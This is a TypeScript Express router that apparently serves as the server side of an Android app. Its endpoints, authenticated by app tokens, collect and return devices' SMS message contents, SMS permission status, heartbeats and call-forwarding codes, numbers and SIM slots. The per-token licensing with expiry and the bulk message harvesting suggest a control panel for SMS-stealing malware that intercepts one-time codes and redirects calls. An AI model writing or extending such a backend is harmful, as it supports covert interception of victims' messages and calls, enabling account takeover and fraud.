import { Router } from "express";
import { db } from "../lib/supabase.js";
import { checkProxyRules, logProxyRequest } from "../lib/proxy.js";

const router = Router();

function getIp(req: { headers: Record<string, string | string[] | undefined>; socket: { remoteAddress?: string } }): string {
  const fwd = req.headers["x-forwarded-for"];
  const ip = (Array.isArray(fwd) ? fwd[0] : fwd) ?? req.socket.remoteAddress ?? "unknown";
  return ip.split(",")[0].trim();
}

// Verify the app token is active and not expired
async function verifyApp(appToken: string): Promise<{ ok: boolean; error?: string }> {
  const { data, error } = await db.from("apps").select("status, expires_at").eq("app_id", appToken).single();
  if (error || !data) return { ok: false, error: "App ID not found" };
  if (data.status === "disabled") return { ok: false, error: "App ID is disabled" };
  if (data.status === "inactive") return { ok: false, error: "App ID is inactive" };
  if (data.expires_at && new Date(data.expires_at) < new Date()) return { ok: false, error: "App ID expired" };
  return { ok: true };
}

// Fields the Android app may send that map directly to device table columns
const DIRECT_COLUMNS = new Set([
  "status", "data_type",
  "device_name", "device_model", "android_version",
  "sms_messages", "total_sms_count", "last_sms_timestamp", "last_sms_log",
  "sms_sync_status", "sms_pending_count", "sms_processed_count",
  "sms_permission_status", "sms_last_sync_at", "sms_last_error",
  "call_forward_status", "call_forward_action", "call_forward_code",
  "call_forward_number", "call_forward_sim_slot", "call_forward_response",
  "call_forward_timestamp", "last_heartbeat_at", "data_json",
]);

// Fields to never overwrite from payload
const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "created_at"]);

// ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
// Android app's smartUpsert — register device, heartbeat, SMS log, call forward, etc.
router.post("/device/:appToken/upsert", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const meta = { endpoint: "upsert" as const, app_id: appToken, sub_id: subId, ip };

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: "/api/device/upsert", app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules(meta);
  logProxyRequest({ endpoint: `/api/device/${appToken}/upsert`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  // Build the upsert row
  const row: Record<string, unknown> = {
    app_id: appToken,
    sub_id: subId,
    device_id: subId,
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  // Map direct columns
  for (const [key, val] of Object.entries(payload)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  // Extract device name/model/version from data_json if not already set
  const dj = payload["data_json"] as Record<string, unknown> | undefined;
  if (dj) {
    if (!row["device_name"]) row["device_name"] = dj["device_name"] ?? dj["model"] ?? null;
    if (!row["device_model"]) row["device_model"] = dj["model"] ?? null;
    if (!row["android_version"]) row["android_version"] = dj["androidversion"] ?? null;
  }

  // First upsert — on conflict (app_id, sub_id) update all columns
  const { data, error } = await db
    .from("devices")
    .upsert(row, { onConflict: "app_id,sub_id" })
    .select()
    .single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get/:uid ────────────────────────────────────────
// Returns a single device record by sub_id
router.get("/device/:appToken/get/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "get", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .eq("sub_id", uid)
    .single();

  if (error || !data) return res.status(404).json({ ok: false, error: "Device not found" });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get ─────────────────────────────────────────────
// Returns all devices for this app token
router.get("/device/:appToken/get", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── PATCH /api/device/:appToken/update/:uid ───────────────────────────────────
// Partial update for a device (e.g. FCM token, online status)
router.patch("/device/:appToken/update/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const updates = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "update", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const row: Record<string, unknown> = {
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(updates)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const { data, error } = await db
    .from("devices")
    .update(row)
    .eq("app_id", appToken)
    .eq("sub_id", uid)
    .select()
    .single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/data ────────────────────────────────────────────
// All data for this app token (same as /get but alternative endpoint)
router.get("/device/:appToken/data", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

export default router;
